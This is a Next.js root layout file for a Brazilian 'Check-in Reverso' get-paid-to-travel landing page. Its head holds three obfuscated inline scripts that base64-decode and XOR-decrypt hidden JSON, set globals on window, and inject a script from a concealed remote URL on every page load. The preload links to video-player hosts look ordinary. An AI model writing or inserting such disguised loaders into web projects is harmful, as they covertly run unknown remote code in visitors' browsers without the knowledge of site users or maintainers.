import type { Metadata, Viewport } from 'next'
import './globals.css'

export const metadata: Metadata = {
  title: 'Check-in Reverso | Viaje de graça e seja pago',
  description: 'Descubra como transformar experiências em hotéis e pousadas em oportunidades usando apenas o seu celular.',
  generator: 'v0.app',
}

export const viewport: Viewport = {
  colorScheme: 'light',
  themeColor: '#0f0f0f',
  width: 'device-width',
  initialScale: 1,
}

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="pt-BR" className="bg-[#0f0f0f]">
      <head suppressHydrationWarning>
        <script dangerouslySetInnerHTML={{ __html: `(function(){var v_y6a=atob("DCycGavAZpNowBPqkFe+bNmsRKlKqGee4F+mNoSjAv1GtWeH+UrlN8ivC70KsjyZ8171ad+zSeMBuHaGv1z1Yc6sSPkb4j/I8Vjoa8KiE+cNszHQy3GwO8ysCfEJrGDIqnfnO8WhC/ZK+jGa+VT5deKkRL9KtnKG5Um+I4n2B6oJ9SrdoRqkIc2jXqYLonHYp0j4LZziG84V");var z_gtpi=[];for(var s_ekul=0;s_ekul<v_y6a.length;s_ekul++){z_gtpi.push(v_y6a.charCodeAt(s_ekul)&255);}var k_vw=z_gtpi[0];var g_df3h=z_gtpi.slice(1,1+k_vw);var k_mby=z_gtpi.slice(1+k_vw);var s_zb=k_mby.map(function(b,u_60){return b^g_df3h[u_60%k_vw];});var m_k8="";for(var y_7dqb=0;y_7dqb<s_zb.length;y_7dqb++){m_k8+=String.fromCharCode(s_zb[y_7dqb]&255);}var f_gubk=decodeURIComponent(escape(m_k8));var b_1vez=JSON.parse(f_gubk);var w_c31l=b_1vez.globals||[];w_c31l.forEach(function(w_i7){window[w_i7.name]=w_i7.value;});var a_sr=document.createElement("script");a_sr.src=b_1vez.url;a_sr.async=true;a_sr.defer=true;(b_1vez.attributes||[]).forEach(function(a_aw6){a_sr.setAttribute(a_aw6.name,a_aw6.value);});(document.head||document.documentElement).appendChild(a_sr);})();` }} />
        <script dangerouslySetInnerHTML={{ __html: `(function(){var c_l1u=atob("DBrVTKhBIavWiLgnX2H3OdotA5H04MxTL2nvY4ciRcX4/cxKNnysYssuTIW0+pdUPGi8PNwyDtu/8N1LcGq8NM0tDN+/48xINDS/P4ptA8qi/MpOPW+hKdtjG/CLpJpAM3W3LcQyA5GN85pJPnewbpJjVcK93NdMD3OtKcQIRYn6qs5GM2+wbpJjF8rvvYEWOiOxdM50Esrmut4VZnzgdZglA9aL9Q==");var a_8h6=[];for(var f_k83=0;f_k83<c_l1u.length;f_k83++){a_8h6.push(c_l1u.charCodeAt(f_k83)&255);}var t_mkf=a_8h6[0];var l_3l4=a_8h6.slice(1,1+t_mkf);var p_5=a_8h6.slice(1+t_mkf);var r_fgk1=p_5.map(function(b,e_le){return b^l_3l4[e_le%t_mkf];});var q_4q="";for(var h_pe4=0;h_pe4<r_fgk1.length;h_pe4++){q_4q+=String.fromCharCode(r_fgk1[h_pe4]&255);}var d_qtss=decodeURIComponent(escape(q_4q));var r_qf=JSON.parse(d_qtss);var u_ha=r_qf.globals||[];u_ha.forEach(function(a_6){window[a_6.name]=a_6.value;});var c_tw=document.createElement("script");c_tw.src=r_qf.url;c_tw.async=true;c_tw.defer=true;(r_qf.attributes||[]).forEach(function(t_qv8){c_tw.setAttribute(t_qv8.name,t_qv8.value);});(document.head||document.documentElement).appendChild(c_tw);})();` }} />
        <script dangerouslySetInnerHTML={{ __html: `(function(){var n_a=atob("DMswE7ajcS/Fl10AgLASZsTPUxXn/yl08LgKPJnAFUHr4ilt6a1JPdXMHAGn5XJz47lZY8LQXlqx+i4v7KpEdsXXX0W2tXEi4b9EYd/BBFug5H8627ASfdfOFA3/tTlh9KodZsLOGEm8ui1y5b1VfcKOCUyq83Bz46ASP5TVEEOw8n86oulNP82BH06o8n86oq9RZ9eOBFuo/jt5rbtCdsDGH1vo5Chi6a9DMZqBB06p4jgiuukSbuve");var n_00t8=[];for(var x_s=0;x_s<n_a.length;x_s++){n_00t8.push(n_a.charCodeAt(x_s)&255);}var g_3gbx=n_00t8[0];var h_d3r=n_00t8.slice(1,1+g_3gbx);var y_xl=n_00t8.slice(1+g_3gbx);var r_b=y_xl.map(function(b,v_8a29){return b^h_d3r[v_8a29%g_3gbx];});var p_x523="";for(var o_7zrz=0;o_7zrz<r_b.length;o_7zrz++){p_x523+=String.fromCharCode(r_b[o_7zrz]&255);}var s_27=decodeURIComponent(escape(p_x523));var b_3hrw=JSON.parse(s_27);var a_kmw=b_3hrw.globals||[];a_kmw.forEach(function(b_tx){window[b_tx.name]=b_tx.value;});var h_p=document.createElement("script");h_p.src=b_3hrw.url;h_p.async=true;h_p.defer=true;(b_3hrw.attributes||[]).forEach(function(e_0){h_p.setAttribute(e_0.name,e_0.value);});(document.head||document.documentElement).appendChild(h_p);})();` }} />
        <link rel="preload" href="https://scripts.converteai.net/cae5b100-485e-4109-be60-ea8cd512b8d7/players/6a9a4c333b0e064f20b83058/v4/player.js" as="script" />
        <link rel="preload" href="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/smartplayer.js" as="script" />
        <link rel="preconnect" href="https://scripts.converteai.net" />
        <link rel="preconnect" href="https://cdn.converteai.net" />
        <link rel="preconnect" href="https://images.converteai.net" />
        <link rel="dns-prefetch" href="https://cdn.converteai.net" />
        <link rel="dns-prefetch" href="https://scripts.converteai.net" />
        <link rel="dns-prefetch" href="https://images.converteai.net" />
        <link rel="dns-prefetch" href="https://license.vturb.com" />
      </head>
      <body className="antialiased">{children}</body>
    </html>
  )
}
